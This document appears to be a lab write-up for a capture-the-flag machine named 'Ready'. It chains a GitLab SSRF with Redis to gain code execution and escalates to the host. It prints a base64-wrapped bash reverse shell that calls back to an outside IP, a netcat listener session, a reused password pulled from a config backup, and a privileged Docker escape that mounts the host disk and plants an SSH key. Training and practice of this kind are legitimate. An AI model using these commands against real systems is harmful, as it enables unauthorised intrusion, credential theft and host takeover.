## Ready

### Lab Details 

- Difficulty: Medium
- Type: Web App, GitLab, SSRF, CRLF, Redis, Docker Escape, Linux

#### Enumeration
- run nmap 
- port `5080` is running `GitLab`
![[version.png]]
- searching online for vulnerabilities for version `11.4.7` and found https://github.com/jas502n/gitlab-SSRF-redis-RCE/tree/master
- version `11.4.7` contains a SSRF vulnerability that we can exploit using `IPv6` to gain access to remote server, RCE then can be executed with`Redis` running on the server 
- 
#### Initial Foothold 
![[Import Repo by URL.png]]
![[modify payload.png]]
- to generate the RCE payload, create a bash reverse shell and then wrap it in base64 decode
```bash
## its better to ensure there is no special characters in the payload
$ echo -n "bash -c 'bash   -i >& /dev/tcp/10.10.16.14/1234   0>&1'" | base64 -w 0
YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE0LzEyMzQgICAwPiYxJw=
```
- entire payload
```bash
echo -n YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE0LzEyMzQgICAwPiYxJw | base64 -d | bash
```
- RCE
```bash
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.10.220] 41532
bash: cannot set terminal process group (515): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ whoami
whoami
git
```
#### Lateral Movement (If any)
- import and run `linpeas`
- found some credentials however doesn't lead us further with lateral movement
- looked up `Gitlab` config files and found user `root` credentials in `/opt/backup/gitlab.rb`
```bash
$ cat /opt/backup/gitlab.rb | grep password                                         
cat /opt/backup/gitlab.rb | grep password
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
```
- we can use `su root` to switch to `root` user with found password
```bash
git@gitlab:/tmp$ su root
su root
Password: wW59U!ZKMbG9+*#h
```
#### Privilege Escalation
- check `/root` directory and no files were found
```
root@gitlab:/tmp# ls /root
ls /root
root@gitlab:/tmp# ls /
ls /
RELEASE  bin   dev  home  lib64  mnt  proc  root_pass  sbin  sys  usr
assets   boot  etc  lib   media  opt  root  run        srv   tmp  var
root@gitlab:/tmp# ls /root
ls /root
```
- from `linpeas` output we can see that the current session is within a `docker` container
```bash
╔══════════╣ Container details
═╣ Is this a container? ........... docker                               

═╣ Any running containers? ........ No
```
- Two conditions to escape from a Docker Container:
    - Container is running in privileged mode
    - Root access is required
- run `lsblk`, to get the name of the partition that we are going to mount
```bash
root@gitlab:/tmp# lsblk
lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop1    7:1    0 55.5M  1 loop 
loop4    7:4    0 71.3M  1 loop 
loop2    7:2    0 71.4M  1 loop 
loop0    7:0    0 55.4M  1 loop 
sda      8:0    0   10G  0 disk 
|-sda2   8:2    0  9.5G  0 part /var/opt/gitlab
|-sda3   8:3    0  512M  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
loop5    7:5    0 31.1M  1 loop 
loop3    7:3    0 31.1M  1 loop 
root@gitlab:/tmp# mount /dev/sda2 /mnt -o loop6
mount /dev/sda2 /mnt -o loop6
```
- once we have access to outside of the container we can access attempt a private in `root`'s directory
```
ssh-keygen -f /mnt/root/.ssh/id_rsa -P ""
cp /mnt/root/.ssh/id_rsa.pub /mnt/root/.ssh/authorized_keys
cat /mnt/root/.ssh/id_rsa
```
#### Resources

#### Lesson Learned
- Chained SSRF attack with Redis
- Docker Escape
